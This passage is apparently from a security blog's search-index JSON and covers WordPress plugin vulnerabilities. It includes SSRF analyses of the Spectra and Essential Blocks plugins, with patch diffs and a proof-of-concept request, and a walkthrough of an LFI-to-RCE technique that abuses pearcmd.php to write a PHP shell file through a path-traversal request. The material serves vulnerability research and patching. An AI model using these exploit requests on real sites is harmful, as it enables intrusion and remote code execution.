POC","uri":"/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rA Server Side Request Forgery (SSRF) vulnerability was discovered in the WordPress Spectra plugin (previously named Ultimate Addons for Gutenberg) affecting versions up to 2.6.6. CVE ID: CVE-2023-36679 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.6.6 Patched Versions: 2.6.7 CVSS severity: Low (7.1) Required Privilege: Contributor Product: WordPress Spectra Plugin ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Spectra: 2.6.6 (vulnerable) and 2.6.7 (patched). Diff tool - Meld or any diff/comparison tool to check and compare differences between the two versions. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable version: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $api_uri = ( isset( $_REQUEST['api_uri'] ) ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } In version 2.6.6, the template_importer() function takes the api_uri parameter directly from $_REQUEST and uses that value to send an HTTP request via wp_remote_get(): Because there is no validation or source restriction, an attacker can supply an arbitrary URL to force the server to make requests to internal addresses. This creates a Server-Side Request Forgery (SSRF) vulnerability. Patched version: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $block_id = isset( $_REQUEST['id'] ) ? absint( $_REQUEST['id'] ) : ''; $block_data = get_option( 'ast-block-templates_data-' . $block_id ); $api_uri = null !== $block_data ? $block_data-\u003e{'astra-page-api-url'} : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } The patch removed taking a URL directly from user input. Instead, the code only accepts a block ID via $_REQUEST['id'] and retrieves the corresponding URL from the database (wp_options) under the key ast-block-templates_data-{id}: Thus, the URL is constrained to records managed by the system, eliminating the ability for a user to provide an arbitrary path. This mechanism prevents SSRF and increases safety when performing server-side API calls. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rtemplate_importer() requires the user to have privileges from Contributor or higher if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } CSRF protection is implemented with a nonce named _ajax_nonce; if the nonce does not match, the logic exits and returns an error. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); Tip The disclosed vulnerability requires Contributor privileges, so the _ajax_nonce value is very likely present in the Admin UI code. For vulnerabilities tied to Contributor privileges and post creation features, you can look for _ajax_nonce by inspecting the post creation/edit UI in the admin (or searching the script/HTML generated by the Admin pages). _ajax_nonce in response\rAfter verification steps, the code takes the api_uri value directly from $_REQUEST, runs it through esc_url_raw(), appends query parameters, and performs an HTTP request using wp_remote_get() $api_uri = isset( $_REQUEST['api_uri'] ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = array( '_fields' =\u003e 'original_content' ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); $response = wp_remote_get( $demo_api_uri, $api_args ); Finally it decodes the response and returns JSON with the original_content key $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); template_importer() is registered as the callback for the action hook: add_action( 'wp_ajax_ast_block_templates_importer', array( $this, 'template_importer' ) ); Meaning, when accessing the endpoint /wp-admin/admin-ajax/php with action=ast_block_templates_importer the template_importer() function is invoked. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rCreate a simple local service with python from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a post and obtain the _ajax_nonce Send a request with api_uri pointing to the local service http://127.0.0.1:8001/test as a Contributor user POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, text/javascript, */*; q=0.01 Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7Cf3dc677b2e483f598ad00a36fbd2f18ed1ed5015b39fc2df533aeb573a8dc3fd; wp-settings-time-2=1761027443; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7C1e8333233a2233576e988302d4f19d5c92470de4cc2bf4c1e31fb65788a44d35 action=ast_block_templates_importer\u0026_ajax_nonce=3ef4c6d6df\u0026api_uri=http://127.0.0.1:8001/test Result: Read content from local service\r","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rVersion ≤ 2.6.6 of the Spectra (Ultimate Addons for Gutenberg) plugin contains an SSRF vulnerability due to using wp_remote_get() with a URL supplied by the user without restricting or validating its source. This allows an account with Contributor privileges to force the WordPress server to make requests to internal addresses. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rDo not trust URLs from the client; only use data available on the server. Prefer wp_safe_remote_get() over wp_remote_get(). Check HTTP response (status, MIME, content). Restrict who can make request calls to the minimum required role. ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:4:4","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Spectra Plugin \u003c= 2.6.6 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analysis"],"collections":null,"content":"Hello. After analyzing 10 CVEs related to LFI in WordPress plugins, I noticed a common barrier: many exploitation vectors are constrained by the requirement to have a .php suffix. This significantly reduces exploitability. During my research I found the article docker-php-include-getshell. That article describes a way to bypass the .php constraint by abusing the pearcmd.php file which is part of PHP’s PECL/PEAR toolkit and is present in WordPress environments deployed on Docker — a very practical trick for no-upload scenarios. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:0:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#"},{"categories":["CVE Analysis"],"collections":null,"content":"What are PEAR and PECL?\rPECL (PHP Extension Community Library): a command-line tool to install and manage PHP extensions. PEAR (PHP Extension and Application Repository): the library platform used by PECL. Before PHP 7.3, PEAR/PECL were often installed by default. From PHP 7.4 onward, PHP must be compiled with --with-pear to include them. However, in official PHP Docker images, PEAR/PECL are still often included, located under /usr/local/lib/php: root@e182501c47c4:/var/www/html# ls /usr/local/lib/php Archive Console OS PEAR PEAR.php Structures System.php XML build data doc extensions pearcmd.php peclcmd.php test ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:1:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#what-are-pear-and-pecl"},{"categories":["CVE Analysis"],"collections":null,"content":"pearcmd.php and register_argc_argv\rpearcmd.php is a PHP script designed to run in CLI mode, for example: php /usr/local/lib/php/pearcmd.php install somepackage It processes arguments from $argv and $argc. When run as CLI this data is obvious. If this file is included in a web context (via LFI), its CLI logic can be abused. The key point is the register_argc_argv setting. If register_argc_argv = On, PHP will populate: $argc $argv $_SERVER['argv'] `argv` in PHP configuration\rWhen WordPress is set up on Docker, register_argc_argv is often enabled by default. The question becomes: when PHP runs under a web SAPI (FPM/Apache) and not in CLI, where does $argv come from? ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:2:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmdphp-and-register_argc_argv"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis of PHP Source Code\rIn the PHP core there is logic like: if (PG(register_argc_argv)) { if (SG(request_info).argc) { ... } else { php_build_argv(SG(request_info).query_string, \u0026PG(http_globals)[TRACK_VARS_SERVER]); } } If there is no argc (not running CLI), PHP calls php_build_argv with SG(request_info).query_string — i.e., the URL’s query string. For example: http://example.com/index.php?a=b\u0026c=d → query_string = \"a=b\u0026c=d\" PHP will use this query string to build the argv variables, so $_SERVER['argv'] can be influenced by the query string. Consequence: When pearcmd.php is included via LFI in a web environment where $_SERVER['argv'] is generated from the query string, an attacker can control the command-line parameters that pearcmd.php reads. Thus, PEAR/PECL command functionality can be abused via the web to perform unwanted actions. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:3:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#analysis-of-php-source-code"},{"categories":["CVE Analysis"],"collections":null,"content":"RFC3875 Explain\rRFC3875 (the CGI spec) defines a form of “indexed” HTTP query — that is, a query string without unencoded = characters sent via GET or HEAD. When encountering such a query, the server SHOULD treat the query-string as a search-string, splitting it into search-words separated by +: search-string = search-word ( \"+\" search-word ) search-word = 1*schar After splitting, each search-word is URL-decoded, optionally re-encoded as system-defined, then added to the command-line argument list (argv) of the CGI program. In short: if the query-string contains no = and is a GET or HEAD request, the server may treat parts separated by + as arguments and pass them into argv. RFC3875 allows a server to turn an “indexed” query-string (GET/HEAD, no unencoded =) into an argv list. The spec excerpt: 4.4. The Script Command Line Some systems support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word ( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | xreserved xreserved = \";\" | \"/\" | \"?\" | \":\" | \"@\" | \"\u0026\" | \"=\" | \",\" | \"$\" After parsing, each search-word is URL-decoded, optionally encoded in a system-defined manner and then added to the command line argument list. PHP previously had a vulnerability related to this (CVE-2012-1823). Today, PHP handles the query-string more broadly than RFC suggests — even when the query-string contains =, it can still be added to $_SERVER['argv']. PHP still adds query strings containing '=' into $_SERVER\\['argv']\r👉 By passing a query string like ?a+b+c+..., PHP will split on + and create $_SERVER['argv'] as an array ['a', 'b', 'c', ...], consistent with RFC3875 semantics. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:4:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#rfc3875-explain"},{"categories":["CVE Analysis"],"collections":null,"content":"Testing PEAR in CLI\rThe author’s article mentions a payload related to config-create, described as used to create a configuration file. Description of config-create\rWhen I tried running the command on CLI: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create config-create: must have 2 parameters, root path and filename to save as When not enough parameters are provided, the program errors and requires two mandatory parameters: root path: the root directory PEAR uses for package installation and configuration lookup. filename: the filename to save the configuration as. Trying with parameters: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php Root directory must be an absolute path beginning with \"/\", was: \"test_root_path\" Here PEAR insists test_root_path must be an absolute path starting with /. Running again with a valid path: root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php The returned output: Configuration (channel pear.php.net): ===================================== Auto-discover new Channels auto_discover \u003cnot set\u003e Default Channel default_channel pear.php.net HTTP Proxy Server Address http_proxy \u003cnot set\u003e PEAR server [DEPRECATED] master_server \u003cnot set\u003e Default Channel Mirror preferred_mirror \u003cnot set\u003e Remote Configuration File remote_config \u003cnot set\u003e PEAR executables directory bin_dir /test_root_path/pear PEAR documentation directory doc_dir /test_root_path/pear/docs PHP extension directory ext_dir /test_root_path/pear/ext PEAR directory php_dir /test_root_path/pear/php PEAR Installer cache directory cache_dir /test_root_path/pear/cache PEAR configuration file cfg_dir /test_root_path/pear/cfg directory PEAR data directory data_dir /test_root_path/pear/data PEAR Installer download download_dir /test_root_path/pear/download directory Systems manpage files man_dir /test_root_path/pear/man directory PEAR metadata directory metadata_dir \u003cnot set\u003e PHP CLI/CGI binary php_bin \u003cnot set\u003e php.ini location php_ini \u003cnot set\u003e --program-prefix passed to php_prefix \u003cnot set\u003e PHP's ./configure --program-suffix passed to php_suffix \u003cnot set\u003e PHP's ./configure PEAR Installer temp directory temp_dir /test_root_path/pear/temp PEAR test directory test_dir /test_root_path/pear/tests PEAR www files directory www_dir /test_root_path/pear/www Cache TimeToLive cache_ttl \u003cnot set\u003e Preferred Package State preferred_state \u003cnot set\u003e Unix file mask umask \u003cnot set\u003e Debug Log Level verbose \u003cnot set\u003e PEAR password (for password \u003cnot set\u003e maintainers) Signature Handling Program sig_bin \u003cnot set\u003e Signature Key Directory sig_keydir \u003cnot set\u003e Signature Key Id sig_keyid \u003cnot set\u003e Package Signature Type sig_type \u003cnot set\u003e PEAR username (for username \u003cnot set\u003e maintainers) User Configuration File Filename /var/www/html/test_filename.php System Configuration File Filename #no#system#config# Successfully created default configuration file \"/usr/www/html/test_filename.php\" The result shows child paths for each type of data being auto-generated under /test_root_path/pear. On the last line: Successfully created default configuration file \"/usr/www/html/test_filename.php\" The configuration file was created in the current working directory, not under root_path. This is PEAR’s default behavior: root_path only affects the layout of install directories, not the location of the saved config file. When accessing the file \"/var/www/html/test_filename.php\" via a browser: Contents of test_filename.php rendered in the browser\rThe created file contains information about test_root_path, presented in serialize format. However, that was the CLI execution path. For web exploitation, one must analyze the source to see how the program accepts and processes parameters passed in. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:5:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#testing-pear-in-cli"},{"categories":["CVE Analysis"],"collections":null,"content":"pearcmd Code Analysis\rBefore analyzing /usr/local/lib/php/pearcmd.php, it’s useful to set up a debugging environment to observe execution flow — see: https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/ Then copy all PHP source from the container to a local machine, preserving directory structure, so when the debugger stops at /usr/local/lib/php/pearcmd.php you can open and inspect the corresponding file from the container: sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/ require_once 'PEAR.php'; require_once 'PEAR/Frontend.php'; require_once 'PEAR/Config.php'; require_once 'PEAR/Command.php'; require_once 'Console/Getopt.php'; $all_commands = PEAR_Command::getCommands(); ... $argv = Console_Getopt::readPHPArgv(); ... $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); array_shift($argv); ... $command = (isset($options[1][0])) ? $options[1][0] : null; ... if ($fetype == 'Gtk2') { ... } else { do { ... $cmd = PEAR_Command::factory($command, $config); ... list($tmpopt, $params) = $tmp; ... $ok = $cmd-\u003erun($command, $opts, $params); if ($ok === false) { PEAR::raiseError(\"unknown command `$command'\"); } ... } while (false); } First, all commands are loaded into $all_commands: $all_commands = PEAR_Command::getCommands(); public static function getCommands() { if (empty($GLOBALS['_PEAR_Command_commandlist'])) { PEAR_Command::registerCommands(); } return $GLOBALS['_PEAR_Command_commandlist']; } getCommands() calls registerCommands() to register the commands. All commands are loaded into `$all_commands`\rThen $argv is initialized: $argv = Console_Getopt::readPHPArgv(); public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } If $argv is not an array (i.e., no valid data), the function tries to find the equivalent in $_SERVER['argv'] and return it — that is, the search-word parts we pass in the URL. Example: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php HTTP/1.1 Observed in the debugger: Value of `$argv` in the debugger\rNext $argv has its first element removed and is passed to Console_Getopt::getopt2(), the return value assigned to $options: array_shift($argv); $options = Console_Getopt::getopt2($argv, \"c:C:d:D:Gh?sSqu:vV\"); The value is now: Values of `$argv` and `$options` in the debugger\rThe $command variable is initialized from $options[1][0], in this case config-create. $command = (isset($options[1][0])) ? $options[1][0] : null; Then a factory is created and assigned to $cmd: $cmd = PEAR_Command::factory($command, $config); Hovering $cmd shows the required parameters for the config-create command. Required parameters for the `config-create` command\rNotably, the execution function for config-create is doConfigCreate: function doConfigCreate($command, $options, $params) { if (count($params) != 2) { return PEAR::raiseError('config-create: must have 2 parameters, root path and ' . 'filename to save as'); } $root = $params[0]; // Clean up the DIRECTORY_SEPARATOR mess $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR; $root = preg_replace(array('!\\\\\\\\+!', '!/+!', \"!$ds2+!\"), array('/', '/', '/'), $root); if ($root[0] != '/') { if (!isset($options['windows'])) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"/\", was: \"' . $root . '\"'); } if (!preg_match('/^[A-Za-z]:/', $root)) { return PEAR::raiseError('Root directory must be an absolute path beginning ' . 'with \"\\\\\" or \"C:\\\\\", was: \"' . $root . '\"'); } } $windows = isset($options['windows']); if ($windows) { $root = str_replace('/', '\\\\', $root); } if (!file_exists($pa","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:6:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#pearcmd-code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rSend a GET request: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/test_root_path+test_filename.php The web app includes /usr/local/lib/php/pearcmd.php. PHP (with register_argc_argv=On) builds $_SERVER['argv'] from the query → ['action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026','config-create','/test_root_path','test_filename.php']. Console_Getopt::readPHPArgv() returns $argv; Console_Getopt::getopt2() parses and yields $command='config-create' and list($tmpopt, $params) gives $params=['/test_root_path','test_filename.php']. doConfigCreate() runs with $params controlled by the attacker → touch()/realpath() and writeConfigFile() create/write the file. Info\rThe created config file contains the root path value. If this value is written as a valid PHP tag (\u003c?php ... ?\u003e) and the file is accessible by the client, the webserver will process the PHP content in that file and the code will be executed, leading to RCE. ","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:7:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rLeveraging CVE-2025-48293 analyzed earlier to expand into an exploit via pearcmd.php Send a request with an LFI payload pointing to pearcmd.php: GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../../../../usr/local/lib/php/pearcmd\u0026+config-create+/\u003c?=phpinfo();?\u003e+/var/www/html/shell.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/ Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 X-PwnFox-Color: blue Priority: u=0, i Successful response returned: Successful response\rAccessing shell.php: shell.php\r","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:8:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Essential Blocks for Gutenberg Plugin.","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Gutenberg Essential Blocks – Page Builder for Gutenberg Blocks \u0026 Patterns plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 5.7.1, via the function eb_save_ai_generated_image. This allows an authenticated attacker with Author-level privileges or higher to perform web requests to arbitrary addresses from the web application, and can be abused to query and exfiltrate information from internal services. CVE ID: CVE-2025-11361 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.7.1 Patched Versions: 5.7.2 CVSS severity: Low (5.5) Required Privilege: Author Product: WordPress Essential Blocks for Gutenberg Plugin ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Essential Blocks for Gutenberg: 5.7.1 (vulnerable) and 5.7.2 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. ","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-22","objectID":"/posts/2025-10-22-cve-2025-11361/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/posts/2025-10-22-cve-2025-11361/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rVulnerable code: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from OpenAI URL $image_data = wp_remote_get( $image_url, [ 'timeout' =\u003e 60 ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from OpenAI.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); $mime_type = $image_info ? $image_info[ 'mime' ] : 'image/png'; // Determine file extension based on MIME type $extension = 'png'; // default switch ( $mime_type ) { case 'image/jpeg': $extension = 'jpg'; break; case 'image/png': $extension = 'png'; break; case 'image/webp': $extension = 'webp'; break; case 'image/gif': $extension = 'gif'; break; } $image_body = wp_remote_retrieve_body( $image_data ); } // other logic } else { wp_send_json_error( __( 'Image data (URL or base64) and prompt are required', 'essential-blocks' ) ); } } In the vulnerable version, the code uses wp_remote_get($image_url) to download an image without validating or restricting the source URL. It does not check the HTTP response code, the MIME type, or the actual content of the returned file, allowing an attacker to abuse this to perform SSRF to internal services or to download malicious content disguised as an image. Patched code: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from validated URL $image_data = wp_safe_remote_get( $image_url, [ 'timeout' =\u003e 30, 'redirection' =\u003e 3, 'user-agent' 